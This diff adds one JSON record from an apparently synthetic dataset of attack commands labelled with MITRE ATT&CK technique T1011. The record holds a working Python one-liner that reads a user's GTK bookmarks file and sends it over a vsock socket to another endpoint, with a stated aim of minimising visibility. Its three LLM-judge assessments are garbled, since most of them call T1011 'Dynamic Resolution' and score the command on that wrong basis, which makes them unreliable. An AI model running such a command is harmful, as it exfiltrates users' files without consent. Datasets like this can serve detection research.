@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((3, 58821)); p=os.path.expanduser('~/.config/gtk-3.0/bookmarks'); s.sendall(open(p,'rb').read()); s.close()\"",
+  "explanation": "Uses AF_VSOCK to send user bookmarks to another vsock endpoint (CID 3) over a non-IP medium, aligning with T1011.",
+  "rationale_steps": [
+    "Use vsock for out-of-band guest communications.",
+    "Target a high, atypical vsock port (58821).",
+    "Read and transmit user file contents over vsock.",
+    "Terminate session promptly to minimize visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-d6562e6e",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper quotes, valid syntax for imports, socket creation, connection, file reading, and data transmission.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid, it uses AF_VSOCK (virtualization socket) which is not aligned with T1011 (Exfiltration Over Other Network Medium) as described - T1011 involves exfiltration over non-standard network protocols, but DGAs and dynamic resolution techniques are not implemented in this command.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:42:38.519758Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code within the `-c` flag is perfectly well-formed, with balanced delimiters and valid statement separators.",
+        "semantic_score": 1,
+        "semantic_justification": "The command connects to a hardcoded VSOCK endpoint without any dynamic resolution, algorithmic determination, or DNS-related behaviors characteristic of T1011.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:42:45.962952Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The python3 -c command contains valid Python with balanced quotes/parentheses and proper separators, making it parseable and runnable as written.",
+        "semantic_score": 1,
+        "semantic_justification": "The command uses a fixed VSOCK CID and port to send a file and does not perform any dynamic or algorithmic endpoint resolution indicative of T1011 Dynamic Resolution.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:42:59.513067Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
